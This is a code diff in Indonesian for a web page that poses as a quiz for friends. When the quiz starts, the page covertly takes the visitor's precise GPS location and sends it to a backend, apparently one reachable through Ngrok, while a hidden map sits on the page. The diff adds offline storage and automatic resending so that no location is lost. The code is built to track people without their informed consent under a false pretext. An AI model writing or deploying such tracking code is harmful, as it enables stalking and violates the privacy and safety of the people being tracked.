@@ -100,12 +100,15 @@
     <!-- Peta Tetap Ada di Kode tapi Dihilangkan dari Layar -->
     <div id="map"></div>
 
-    <!-- Leaflet JS -->
+  <!-- Leaflet JS -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         let map, marker;
 
-        // Inisialisasi Peta secara Tersembunyi
+        // Ganti URL ini dengan URL Ngrok / Backend Cloud kamu
+        const BACKEND_URL = 'http://localhost:3000/api/simpan-lokasi';
+
+        // 1. Inisialisasi Peta (Tersembunyi)
         function initMap(lat, lon) {
             if (!map) {
                 map = L.map('map').setView([lat, lon], 16);
@@ -116,31 +119,88 @@
             }
         }
 
-        // Fungsi Kirim Data Lokasi ke Backend MySQL / Ngrok Kamu
+        // 2. Fungsi Utama untuk Kirim Data ke Database
         function kirimKeDatabase(lat, lon, akurasi) {
-            fetch('http://localhost:3000/api/simpan-lokasi', { // Ganti URL ini dengan URL Ngrok/Backend Cloud kamu
+            const dataLokasi = {
+                latitude: lat,
+                longitude: lon,
+                akurasi: akurasi,
+                waktu: new Date().toISOString()
+            };
+
+            // Coba kirim langsung jika ada koneksi
+            fetch(BACKEND_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    latitude: lat,
-                    longitude: lon,
-                    akurasi: akurasi
-                })
+                body: JSON.stringify(dataLokasi)
             })
             .then(res => res.json())
-            .then(data => console.log('Lokasi terkirim secara stealth.'))
-            .catch(err => console.error(err));
+            .then(data => {
+                console.log('Berhasil terkirim langsung ke database!');
+                // Kirim juga data pending jika sebelumnya ada yang tersimpan saat offline
+                kirimDataPending();
+            })
+            .catch(err => {
+                console.warn('Gagal terhubung ke server/Offline. Menyimpan ke memori HP...');
+                simpanKeOfflineStorage(dataLokasi);
+            });
         }
 
-        // Fungsi yang Dipanggil Saat Teman Menekan Tombol "Mulai Kuis"
+        // 3. Simpan ke Memori Browser HP (Jika Offline/Gagal Kirim)
+        function simpanKeOfflineStorage(dataLokasi) {
+            let pendingData = JSON.parse(localStorage.getItem('pending_locations')) || [];
+            pendingData.push(dataLokasi);
+            localStorage.setItem('pending_locations', JSON.stringify(pendingData));
+            console.log('Data disimpan secara offline di HP.');
+        }
+
+        // 4. Kirim Data yang Tertunda begitu Koneksi Online
+        function kirimDataPending() {
+            let pendingData = JSON.parse(localStorage.getItem('pending_locations')) || [];
+            
+            if (pendingData.length > 0 && navigator.onLine) {
+                console.log(`Mengirim ${pendingData.length} data lokasi yang tertunda...`);
+
+                pendingData.forEach((item, index) => {
+                    fetch(BACKEND_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(item)
+                    })
+                    .then(res => res.json())
+                    .then(() => {
+                        // Hapus dari pending storage setelah sukses terkirim
+                        pendingData.splice(index, 1);
+                        localStorage.setItem('pending_locations', JSON.stringify(pendingData));
+                        console.log('Data pending berhasil terkirim!');
+                    })
+                    .catch(err => console.error('Gagal mengirim data pending:', err));
+                });
+            }
+        }
+
+        // Event Listener: Deteksi Otomatis saat HP Terhubung Kembali ke Internet
+        window.addEventListener('online', function() {
+            console.log('Koneksi internet kembali aktif! Memulai pengiriman data tertunda...');
+            kirimDataPending();
+        });
+
+        // Cek data tertunda saat halaman dibuka
+        window.onload = function() {
+            if (navigator.onLine) {
+                kirimDataPending();
+            }
+        };
+
+        // 5. Fungsi yang Dipanggil Saat Tombol Kuis Ditekan
         function mulaiKuis() {
-            // 1. Ubah tampilan ke Pertanyaan Kuis
             document.getElementById('start-screen').style.display = 'none';
             document.getElementById('quiz-screen').style.display = 'block';
 
-            // 2. Memicu Izin GPS secara Tersembunyi di Latar Belakang
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -152,7 +212,7 @@
                         kirimKeDatabase(lat, lon, akurasi);
                     },
                     (error) => {
-                        console.warn("Layanan kuis tetap berjalan meski lokasi ditolak.");
+                        console.warn("Layanan kuis tetap berjalan.");
                     },
                     {
                         enableHighAccuracy: true,
